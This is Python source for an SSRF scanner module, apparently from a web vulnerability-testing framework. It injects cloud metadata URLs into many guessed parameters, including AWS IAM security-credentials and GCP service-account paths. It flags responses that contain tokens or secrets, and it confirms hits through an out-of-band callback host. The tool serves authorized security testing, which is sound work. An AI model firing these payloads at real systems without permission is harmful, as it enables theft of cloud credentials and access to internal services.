"""
SSRFScanner — Server-Side Request Forgery detection with OOB confirmation.

Lifecycle:
  DETECTED:   Cloud metadata signature matched (1-2 sigs, low confidence)
  VALIDATED:  Strong metadata response (2+ sigs, JSON body, credentials)
  EXPLOITABLE: (not applicable — SSRF is inherently exploitable)
  VERIFIED:   OOB callback received

Maturity: Level 4 (OOB-confirmed)
"""

import hashlib
import time
from typing import Any, Optional
from urllib.parse import urlparse, urlencode, parse_qs

from modules.utils import (
    finding, log, Colors, _build_curl, safe_get,
    VerificationStage,
)
from scanners.base import ScannerBase

SSRF_PARAM_NAMES = [
    "url", "uri", "path", "file", "document", "page", "redirect",
    "dest", "target", "next", "proxy", "endpoint", "link",
    "image", "img", "src", "load", "fetch", "read", "include",
    "host", "domain", "reference", "callback", "webhook",
]

SSRF_SIGNATURES = [
    "ami-id", "ami-launch-index", "ami-manifest-path", "block-device-mapping",
    "hostname", "iam", "instance-action", "instance-id", "instance-type",
    "local-hostname", "local-ipv4", "mac", "metrics", "network",
    "placement", "product-codes", "public-hostname", "public-ipv4",
    "public-keys", "reservation-id", "security-groups",
    "meta-data", "user-data", "ec2_", "iam_role",
]

DEFAULT_SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
    "http://100.100.100.200/latest/meta-data/",
]


class SSRFScanner(ScannerBase):
    SCANNER_NAME = "ssrf"
    SCANNER_MATURITY = 4

    def __init__(self, config: dict, recon: dict, container=None):
        super().__init__(config, recon, container=container)

    def scan(self, target_urls: list[str] | None = None) -> list[dict]:
        oob_host = self.config.get("oob_host")
        urls = self.recon.get("urls", []) if target_urls is None else target_urls

        for url in urls:
            if not self._in_scope(url):
                continue
            try:
                parsed = urlparse(url)
                original_params = parse_qs(parsed.query)
                params = list(dict.fromkeys(list(original_params.keys()) + SSRF_PARAM_NAMES))

                baseline_resp = safe_get(self.session, url, self.timeout)
                baseline_hash = hashlib.md5(baseline_resp.text.encode()).hexdigest() if baseline_resp else None
                baseline_len = len(baseline_resp.text) if baseline_resp else 0

                ssrf_payloads = DEFAULT_SSRF_PAYLOADS
                vulnerable_params: list[str] = []
                all_matched_sigs: set[str] = set()
                all_test_urls: list[str] = []
                json_detected = False
                credentials_found = False

                for param in params:
                    for payload in ssrf_payloads:
                        test_url = self._build_ssrf_url(url, parsed, original_params, param, payload)
                        resp = safe_get(self.session, test_url, self.timeout)
                        if not resp:
                            continue
                        body = resp.text
                        matched = [sig for sig in SSRF_SIGNATURES if sig in body]
                        if matched and len(matched) >= 2:
                            vulnerable_params.append(param)
                            all_matched_sigs.update(matched)
                            all_test_urls.append(test_url)
                            if body.strip().startswith("{"):
                                json_detected = True
                            if "secret" in body.lower() or "token" in body.lower() or "password" in body.lower():
                                credentials_found = True

                        if oob_host:
                            oob = self.validation.oob if self.validation else None
                            if oob:
                                oob_url = self._build_ssrf_url(url, parsed, original_params, param,
                                    f"http://{oob.callback_token}.{oob_host}/ssrf")
                                safe_get(self.session, oob_url, self.timeout, raise_for_status=False)
                                oob.register_interaction("ssrf", oob_url, test_url)

                if vulnerable_params:
                    resp_hash = hashlib.md5(resp.text.encode()).hexdigest()
                    baseline_diff = baseline_hash is not None and resp_hash != baseline_hash
                    confidence_score = self._calculate_ssrf_confidence(
                        list(all_matched_sigs), baseline_diff, json_detected, credentials_found,
                    )
                    if confidence_score < 40:
                        log(f"  [SSRF] Skipped {url} (confidence {confidence_score}% < 40%)",
                            Colors.WHITE, verbose_only=True, verbose=self.verbose)
                        continue
                    f = finding(
                        vuln_type="Confirmed SSRF",
                        url=url,
                        severity="critical",
                        details=f"Vulnerable parameters ({len(vulnerable_params)}): {', '.join(vulnerable_params[:10])}",
                        evidence=f"Signatures: {', '.join(list(all_matched_sigs)[:5])}",
                        request=_build_curl("GET", url, dict(self.session.headers), cookies=dict(self.session.cookies)),
                        response_excerpt=resp.text[:500],
                        steps_to_reproduce=[f"Send request to {url}", f"Observe cloud metadata signature in response"],
                        verification_stage=VerificationStage.VALIDATED.value,
                        validation_steps=[f"Cloud metadata signature matched: {s}" for s in all_matched_sigs],
                        confidence_score=confidence_score,
                    )
                    if f and self._add_finding(f):
                        pass

            except Exception as e:
                log(f"  [SSRF] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)

        oob = self.validation.oob if self.validation else None
        if oob:
            confirmed_oob = oob.poll()
            for entry in confirmed_oob:
                oob_url = entry.get("url", "")
                f = finding(
                    vuln_type="Confirmed SSRF (OOB)",
                    url=oob_url,
                    severity="critical",
                    details="OOB callback received for SSRF probe — DNS/HTTP interaction confirmed from target server",
                    evidence=f"Callback: {entry.get('payload', '')} | Confirmed: DNS/HTTP callback received",
                    request=_build_curl("GET", oob_url, dict(self.session.headers), cookies=dict(self.session.cookies)),
                    verification_stage=VerificationStage.VERIFIED.value,
                    validation_steps=["OOB callback verified: DNS/HTTP interaction confirmed from target infrastructure"],
                    response_excerpt="(SSRF confirmed via out-of-band callback — DNS/HTTP request received from target server)",
                    steps_to_reproduce=[
                        f"Send SSRF probe to {oob_url}",
                        "Observe OOB callback on listener — confirms server makes external requests",
                        "Use SSRF to access internal services or cloud metadata",
                    ],
                )
                if f and self._add_finding(f):
                    pass

        return self._get_findings()

    def _build_ssrf_url(self, url: str, parsed, original_params: dict, param: str, payload: str) -> str:
        if param in original_params:
            return self._inject_param(url, param, payload)
        separator = "&" if parsed.query else "?"
        return f"{url}{separator}{urlencode({param: payload})}"

    @staticmethod
    def _inject_param(url: str, param: str, value: str) -> str:
        from urllib.parse import urlunparse
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [value]
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    @staticmethod
    def _calculate_ssrf_confidence(signatures: list[str], baseline_diff: bool,
                                    json_detected: bool, credentials_found: bool) -> int:
        score = 0
        if len(signatures) >= 3:
            score += 40
        elif len(signatures) >= 2:
            score += 30
        elif signatures:
            score += 20
        if baseline_diff:
            score += 15
        if json_detected:
            score += 15
        if credentials_found:
            score += 20
        return min(100, score)
